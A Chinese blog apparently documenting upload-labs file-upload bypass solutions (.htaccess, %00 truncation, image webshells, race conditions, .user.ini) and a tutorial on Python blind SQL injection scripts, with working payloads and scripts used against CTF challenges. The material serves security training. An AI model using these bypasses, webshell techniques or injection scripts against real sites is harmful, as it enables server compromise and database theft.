这串代码的意义是删去文件名末尾的点，并截取后缀，将后缀转换为小写，删去前面定义的字符串数组里的内容并收尾去空。 Pass-04这关过滤的是真的狠，把我们前面讲的几个全部过滤了，当然我们也可以fuzz试试有没有漏网之鱼。在这关中，我们要使用到.htaccess文件来帮助我们过关。 这里截取了一段网络上关于.htaccess的介绍： htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 其中，.htaccess文件中内容SetHandler application/x-httpd-php用来设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。 首先我们要创建一个txt文件，在这个文件中写入SetHandler application/x-httpd-php，接着更改后缀为.htaccess，但是由于windows的命名规则导致文件不能没有文件名，因此我们先随意取一个文件名。当然也可以使用FilesMatch指定文件，示例如下： 123&lt;FilesMatch &quot;muma&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这意味着文件名字中带有muma的文件会被解析成php。在上传.htaccess文件时要使用burp suite将这个文件的文件名删去。接着只要上传我们的muma1.jpg，用蚁剑连接就可以了。 Pass-05这一关连.htaccess都过滤了，但是我们查看源码发现，这题只过滤了一次.和空格，因此我们构建muma1.php. .文件名就可以成功绕过了，进入upload发现文件依然是muma1.php。 Pass-06查看源码发现没有大小写转化，意味着这题可以进行大小写绕过，将文件后缀改为.phP或者.pHp等等都是可以的，当然更改.htaccess的大小写进行绕过同样可行。 Pass-07查看源码发现没有对后缀名去空，那么我们上传一个muma1.php文件，并使用burp suite抓包，将文件名改成muma1.php ，后缀名后添加空格即可绕过后端php脚本的检测，再上传到windows服务器上，会自动去除后缀名后的空格。 Pass-08查看源码发现没有过滤后缀中的点，那么我们上传一个php文件后抓包将文件名后缀改成.php.就可以了。windows系统特性会自动忽略最后一个点，添加点即可绕过后端的php检测，而且可以正常解析。 Pass-09这一关没有过滤::$DATA，我们在上传php文件后抓包，在文件后缀最后加上::$DATA。在windows中::$DATA会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，起到绕过后端检测的效果。 Pass-10这关解法和Pass-05是一样的，muma1.php. ，而且还真没啥区别，严重怀疑是传重了。 Pass-11看源码： 1234567if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; 这关起到过滤作用的是str_ireplace()函数，它会检测文件名中包含$deny_ext的字符并替换为空。在做sqli-labs时我们也遇到了类似的情况，同样的，使用双写绕过，将文件后缀改为.pphphp这类的上传就可以了。这样，后缀在后端过滤掉php后，剩下的内容仍然为php。 而如果上传.pphhpp这种是无法绕过成功的，因为没有连续的php，导致这个后缀没有被过滤而成功上传，但上传后的结果仍然是.pphhpp，webshell工具无法连接这种后缀。 Pass-12前面的题目均为黑名单绕过，意思是我们不能上传黑名单中的含有后缀的文件。而这一关往后几关是白名单绕过，意味着我们只能上传白名单中含有后缀的文件。 12345678910111213141516171819$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 我们发现$img_path直接拼接，而且GET的save_path可控，这里要运用到截断上传的原理。 url中，%00对应的ascii码值为0，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片，这和sqli-labs的23关原理是一致的，相信刷完sqli-labs对截断这个操作已经不陌生了。 因此，我们首先上传一个muma1.jpg，接着抓包，修改GET内容为../upload/muma1.php%00： 查看upload文件夹发现上传成功。 ps.php版本要小于5.3.4，magic_quotes_gpc需要为Off状态。 Pass-13这关和上关思路是一致的，也是%00的截断，但是由于这题是POST注入，POST注入不会自动解码%00，因此我们需要修改16进制码来进行截断。 首先我们上传muma1.jpg并抓包，然后将抓包内容发送至Repeater中，在POST内容最后添加上muma1.php： 接着我们在Hex中找到对应的十六进制码（php的十六进制码为70 68 70），因此我们将在这串编码后的值更改为00，Go一次之后我们就可以在upload文件夹中发现muma1.php了： Pass-14这关涉及到了上传图片码，首先我们要了解什么是图片码。图片码，又名图片一句话。顾名思义，就是将一句话木马藏匿在图片之中，从而达到绕过检查的效果。我们来介绍两种制作图片码的方法： cmd命令制作将你的php木马文件和图片放在同一个目录之下，shift+右键在这个目录下打开cmd，输入以下命令： 1copy tupian.jpg /b + muma1.php /a shell.jpg 这里的tupian.jpg是我们的原始图片，muma1.php是一句话木马文件，最后生成的文件是shell.jpg。我们可以用010打开这个文件，发现木马已经被成功写入图片中：同样的方法我们也可以制作png图片码和gif图片码。 二进制软件应用（010、winhex等）我们可以用010打开一张图片，直接在图片最后加上一句话木马，要注意不要破坏原文件的文件尾，导致文件上传时无法识别。 有了图片码，就可以直接进行文件上传了，但是由于菜刀和蚁剑等shell工具无法解析图片文件，因此我们要利用到文件包含漏洞。关于文件包含漏洞之前也写过了一篇博客，也可以参考下面这篇博客：Web安全实战系列：文件包含漏洞 在upload文件夹中写入下面这个php文件： 123456789&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);$file = $_GET[&#x27;file&#x27;];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 这里我把文件命名为include.php 我们构建一个url读取图片： 1127.0.0.1/upload-labs/upload/include.php?file=9220211125204748.gif 读取成功，但是读取出来一段乱码，结果不明显，我们写入phpinfo()测试：成功。 为了和第15关区别，我们进行源码分析： 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; 本关源码以二进制读取模式打开文件，并读取两个字节。而unpack的作用是解包，用什么打包就用什么解包，这里是将$bin中的以二进制的形式解包输出到chars中，接着使用intval()函数将值转换为十进制，并对比转换出来的值是否为对应文件的文件头值，最后将文件类型返回导$fileType中。因此我们只能上传jpg、png或gif格式的文件，否则检查不会通过。 Pass-15这关直接上传上关制作的图片码，用同样的方法就可以解除题目。这两关的差别主要在于源码的检查方式不同，我们查看源码： 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 本关使用了getimagesize()函数获取到图片信息，接着使用image_type_to_extension()函数获取图片后缀，最后判断文件中是否存在.jpeg|.png|.gif文件（这个检查利用文件的十六进制码进行），如果有则成功通过检查，否则上传失败。因此我们制作的图片码可以绕过，因为图片码本身就是一张图片，前面的文件内容可以通过检查。 Pass-16这关由于用到了exif_imagetype()，因此要开启php的php_exif模块。这关的检查就比较简单粗暴了，直接使用exif_imagetype()来判断图像的类型：函数读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的值，如果不为.jpeg|.png|.gif文件则返回false阻止文件上传： 1234567891011121314151617function isImage($filename)&#123; $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; 不过由于本质上还是检查.jpeg|.png|.gif文件，因此我们上传图片码并利用文件包含就可以顺利解题了。 Pass-17这题提示我们对图片进行了二次渲染，这意味着我们之前写进图片中的一句话木马会被抹掉，我们上传一个图片码试试： 我们发现原本的一句话木马被抹去了，这就意味着写入失败，我们来看看源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 这里二次渲染用到了几个和imagecreat有关的函数，例如imagecreatefromgif()，作用就是创建一个画布，并从GIF文件或URL地址中载入一副图像。渲染后的图像利用move_uploaded_file()将上传的文件移动到新位置下，最后用unlink()删除原文件。 关于这关的写入方法，由于gif文件在二次渲染之后会保留一段和渲染前相同的内容，而jpg与png则没有这段内容。因此我们选择gif文件，将木马写入渲染前后内容一致的部分中，利用文件包含漏洞解题就可以了。 Pass-18这里涉及到了文件上传的竞争条件，2020年的黑盾杯就有这个考点。提示说这题需要代码审计，那么我们就分析代码： 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125;&#125; 分析代码，这里程序用move_uploaded_file()对文件进行转存后读取后缀并进行对比，如果后缀不为.jpg|.png|.gif的话则使用unlink函数删除文件。而条件竞争漏洞就运用到了在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致防护被绕过。 网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件，或者网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件，在类似这两种情况下我们就可以考虑使用竞争条件漏洞解题。 那么我们要怎么利用这个时间差访问文件呢？答案就是爆破上传。使用burp suite营造很多人上传info.php（&lt;?php phpinfo();?&gt;）的场景，同时我们用蚁剑连接，下面是具体流程：首先我们上传文件并抓包，将抓包内容发送到Intruder中，随意构建一个payload爆破点，例如我选定GET中的action内容进行爆破，设置字典为1-9999的数字，设置10线程。 设置完之后进行攻击，在攻击的同时不断访问127.0.0.1/upload/info.php，将phpinfo的页面刷新出来后在upload文件夹中就可以发现info.php也成功上传。 Pass-19这关同样也是竞争条件漏洞，不过这关除了检测后缀，还检测了文件大小、文件名是否重复、目录是否可写等等，将文件上传后，对文件重新命名。本关上传图片码然后用文件包含伪协议读取即可。这告诉我们，只要我们访问的够快，程序就来不及重命名我们的文件。 我们可以写一个python脚本帮助我们读取文件： 123456789import requestsurl = &quot;http://127.0.0.1/upload/include.php?info.jpg&quot;while True: r = requests.get(url) if &quot;phpinfo&quot; in r.text: print(&quot;OK&quot;) break else: print(&quot;NO&quot;) 跑到脚本出现OK后就成功了。 Pass-20本关又一次用到了move_uploaded_file()，而且是由POST方式获取文件，因此可以使用13关的过关方式：%00截断，更改Hex中的十六进制码即可。 我们来看看本关的源码： 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这关检验的是黑名单，如果后缀与黑名单的内容一致则禁止保存，反之则以设定的保存名称作为文件名保存。介绍另一个方法，这里move_uploaded_file()除了%00截断之外，还会忽略掉文件末尾的/.，这里我们可以利用这一点构建文件名： 发现info.php已经成功写入upload文件夹中。 Pass-21这题是数组绕过与/.绕过相结合，我们审计一遍代码： 12345678910111213$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file));&#125;$ext = end($file);$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;;&#125;else&#123;$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; 我们注意到这段代码中有一个判断语句，如果$file不为数组则进行白名单检测，否则不检测。同时发现$file_name经过reset($file) . &#39;.&#39; . $file[count($file) - 1];处理,如果上传的是数组的话，会跳过$file = explode(&#39;.&#39;, strtolower($file));，因此我们可以让$file为数组： 首先绕过MINE，我们的目的是让文件成功命名为info.php/，并通过move_uploaded_file()出去/.。而命名的规则为$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];，因此我们要让reset($file)返回info.php/，$file[count($file) - 1]返回空值，即$file[0]为smi1e.php/，$file[2]为白名单中的jpg用于绕过过滤。这样就成功绕过了过滤。 但是这个看着真的很绕，也很难彻底理解，这里也就理解了个大概，具体原理还要继续深入研究。 .user.ini在之前的关卡中，我们用到了.htaccess文件，但是这个文件的使用是有局限性的，只有在apache服务器环境下才可以使用。因此这里补充一个绕过方法：上传.user.ini文件。 只要服务器脚本语言为php，对应目录下有可用php文件，服务器使用CGI/FastCGI模式，就可以通过上传.user.ini绕过黑名单检验： 首先构建.user.ini文件，内容为： 1auto_prepend_file=a.jpg //为了绕过过滤需要添加例如jpg的文件头 然后依次上传.uesr.ini和图片码，图片便会被解析成php文件 总结系统地刷完了upload-labs，学习了文件上传的各种绕过姿势： MINE绕过 更改后缀（&#39;.php. .&#39;&#39;.phP&#39;&#39;.phtml&#39;&#39;.php &#39;&#39;.php.&#39;等等） 上传.htaccess或.user.ini文件 竞争条件 上传图片码 %00截断 /.截断 同时这个靶场也锻炼了代码审计能力，还是很有收获的。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"python盲注脚本编写","slug":"python盲注脚本编写","date":"2021-11-19T04:47:02.000Z","updated":"2021-11-19T13:53:36.147Z","comments":true,"path":"2021/11/19/python盲注脚本编写/","link":"","permalink":"http://example.com/2021/11/19/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/","excerpt":"前言盲注作为sql注入最常见的考点，掌握脚本的编写是十分重要的，盲注脚本分为布尔盲注和时间盲注，同时还有字典法和二分法。","text":"前言盲注作为sql注入最常见的考点，掌握脚本的编写是十分重要的，盲注脚本分为布尔盲注和时间盲注，同时还有字典法和二分法。 编写脚本常用的函数先介绍几个写脚本时常用的python函数。 range()函数格式为range(start,stop[,step])，分别表示起始值，终止值与步长。如果不指定start值则默认为0，不指定步长则默认为1，range()的作用是创建一个整数列表，范围为start~(stop-1)，一般用于for循环中。下面提供几个例子： 12345678for i in range(1,5): print(i)结果：1 2 3 4for i in range(3): print(i)结果：1 2 for循环函数格式为for iterating_var in sequence: statements(s)，是我们编写脚本的基石。python中的for循环和c的for循环还是有很大差别的，python的for循环首先将sequence中的一个值赋值给iterating_var，然后进行循环语句，执行完后继续赋值执行，知道所有值都赋给了iterating_var一遍。下面提供几个例子： 1234567891011for i in &#x27;nihao&#x27;: print(&quot;%s&quot;% i)结果：n i h a odic=[&#x27;union&#x27;,&#x27;ascii&#x27;,&#x27;long&#x27;]for i in dic: print(&#x27;%s&#x27;% dic)结果：union ascii long format()格式化函数，通过&#123;&#125;和:来构建语句，用format函数中的内容替代前面{}中的内容。format()可以接受不限个参数，位置可以不按顺序。直接上几个例子来直观感受（例子引用自菜鸟教程）： 123456789101112131415161718192021222324&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # 不设置指定位置，按默认顺序&#x27;hello world&#x27; &quot;&#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # 设置指定位置&#x27;hello world&#x27; &quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # 设置指定位置&#x27;world hello world&#x27;# 设置参数print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(name=&quot;菜鸟教程&quot;, url=&quot;www.runoob.com&quot;)) # 通过字典设置参数site = &#123;&quot;name&quot;: &quot;菜鸟教程&quot;, &quot;url&quot;: &quot;www.runoob.com&quot;&#125;print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(**site)) # 通过列表索引设置参数my_list = [&#x27;菜鸟教程&#x27;, &#x27;www.runoob.com&#x27;]print(&quot;网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;&quot;.format(my_list)) # &quot;0&quot; 是必须的以上三条结果均为：网站名：菜鸟教程, 地址 www.runoob.com 当然使用%进行格式化也是可以的，这里也给一个例子： 12345params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (1, 64)params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;64)^1&quot;# 上两式是等价的 requests进行GET请求或者POST请求来获取页面： 123r = requests.get(&#x27;url&#x27;) #get请求r = requests.post(&#x27;url&#x27;，data=&#123;&#x27;key&#x27;=&#x27;value&#x27;&#125;) #post请求 parmsparams关键字参数可以用一个字符串字典来提供这些参数。方法申明一个params关键字后，就不允许在其后面再有任何其他参数。这里也简单给个例子： 1234payload=&#123;&quot;id&quot;: &quot;1&quot;&#125;r = requests.get(&quot;http://127.0.0.1&quot;,params=payload)结果：http://127.0.0.1/?id=1 headers用来将头文件写入，对于cookie注入、xff伪造的题目等需要用到 data用于POST时将数据传入。 time.sleep()推迟调用线程的运行，格式为time.sleep(sec),可以通过设置参数sec来调整秒数，这个函数没有返回值。 time.time()返回当前时间的时间戳，这个函数没有参数，用于时间盲注时使用。 注意事项python不像c一样使用花括号将函数语句括起，因此编写程序时尤其要注意代码的缩进，相邻同缩进的代码意味着一堆代码块。 布尔盲注脚本目前认识到的脚本主要就两种，字典法与二分法。刚好这次培训课都有，我就直接拿来用。 首先是字典爆破法： 12345678910111213141516171819import requestsimport timedic = &quot;abcdefghijklmnopqrstuvwxyz1234567890_@&quot;flag = &quot;&quot;for i in range(1,20): for char in dic: url = &quot;http://e9ea91bf-1968-4779-b9aa-52f15b8ef793.node4.buuoj.cn/Less-8/?id=1&#x27;&quot; payload = &quot;and substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;.format(i,char) url = url + payload r=requests.get(url) time.sleep(0.05) if &quot;are&quot; in r.text: flag += char print(flag)print(flag) 这个脚本是拿来跑sqli-labs-less8的，用的是buu的环境，跑的是security库中的表名。这个脚本解释一下就是将dic的内容一个一个试，如果试出来页面回显的内容有一个“are”就记录到flag中，依次打印，并在最后将最终结果打印出来。sleep函数是为了限制程序运行的速度以免速度过快导致页面不稳定或重复打印。而且要注意，这个方法不区分大小写。 二分法本来给的是[极客大挑战2019]finalsql的脚本，我直接贴出来了： 123456789101112131415161718192021222324252627import requestsimport timeurl = &quot;http://31bff700-e9d3-434e-8498-3eae23e162ac.node4.buuoj.cn:81/search.php&quot;params = &#123;&quot;id&quot;: &quot;&quot;&#125;flag= &quot;&quot;for i in range(1, 500): time.sleep(0.06) low = 32 high = 128 mid = (low + high)&gt;&gt;1 while (low &lt; high): params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid) r = requests.get(url, params=params) time.sleep(0.05) if &quot;Cl&quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt;1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) 二分法跑脚本的效率是远高于字典法的，当然这里用到的是堆叠注入。ascii码32到128是可打印字符，因此我们判断也是取这个范围。首先我们拿中间值（也就是80）去进行判断，如果大于80就拿右半部分的中间值判断，反之拿左半部分的中间值判断，直到判断成功后，将这个值加一后赋值给flag储存。至于为什么要加一，是因为我们判断语句是大于号，因此实际值会与测试值相差一位，我们要补上这一位。 时间盲注时间盲注脚本和布尔盲注脚本的区别主要在于原理和payload的构建上。这里直接贴一部分出来： 123456789101112while low &lt; high: payload = &quot;if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)&quot;%(i,mid) params = &#123;&#x27;id&#x27;:payload&#125; start_time = time.time() r = requests.get(url,params = params) end_time = time.time() if end_time - start_time &gt; 1: low = mid + 1 else: high = mid mid = (low + high) // 2 首先原理依然是二分法。在payload构建中，我们使用了if语句，让查询语句如果为真，就执行sleep(1)函数，再根据加载时间是否为1判断查询语句真假。其他方面和布尔盲注没有太大区别。 作业wp[极客大挑战2019]finalsql这题由于脚本已经给了就没什么好写的，主要要注意这题的注入点不在POST框中，而是在点击数字后页面中以GET形式注入，更改id后的值即可。脚本在上文有，爆库爆表可以自行修改，这题主要是过滤了空格和其他查询方式的相关关键字。 还有要吐槽一点，这个表里面的数据又臭又长，flag藏在最后，绝了。 [RoarCTF 2019]Online Proxy这题也是相当恶心人了。如果没有去查看源码的话可能就会GET一个url进去然后和这个url斗智斗勇。但是查看源码后我们发现这么一段： 1Debug Info: Duration: 0.095027923583984 s Current Ip: 222.76.115.182 看到这个current ip马上就能想到xff，我们伪造一个xff试试： 我们发现current ip已经更改了，而由于我上个测试的是111，因此last ip就是111，如果我们再注入一次111，那么current ip就会变成111而last ip会变成1’or’1。但是当我们在这种情况下再注入一次111，我们会发现有意思的事出现了： 我们发现last ip变成了1，这说明1’or’1语句被执行了。这是由于当两次上传的内容相同时，current ip也是相同的，因此数据库就会找到last ip并执行。那么很明显，这里就是注入点了，所以这和proxy一点关系都没有（，只能说你这注入点挺能藏啊。 这题要用到的是盲注，我们使用布尔盲注，而且题目提示我们flag在uuid里，因此cookie里的uuid这段便是我们的目标。综合以上，我们开始写脚本： 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl = &quot;http://node4.buuoj.cn:28368/&quot;head = &#123; &quot;Cookie&quot;: &quot;track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2&quot;, &quot;X-Forwarded-For&quot;: &quot;&quot;&#125;flag = &quot;&quot;for i in range(1, 150): time.sleep(0.06) low = 32 high = 128 mid = (low + high) &gt;&gt; 1 while low &lt; high: head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125; or&#x27;0&quot;.format(i, mid) r = requests.post(url, headers=head) head[&quot;X-Forwarded-For&quot;] = &quot;111&quot; r = requests.post(url, headers=head) r = requests.post(url, headers=head) time.sleep(0.05) if &quot;Last Ip: 1&quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt; 1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) 跑出来库名： 猜测flag在F4l9_D4t4B45e库中，接下来构建查表、查列、查数据的payload： 1234567891011#查表&quot;0&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125; or&#x27;0&quot;.format(i, mid)#结果：F4l9_t4b1e#查列&quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)#结果：F4l9_C01uMn#查数据&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)#结果：flag&#123;G1zj1n_W4nt5_4_91r1_Fr1end&#125;,flag&#123;20c02151-818b-4e3e-b853-322da92a0bed&#125; 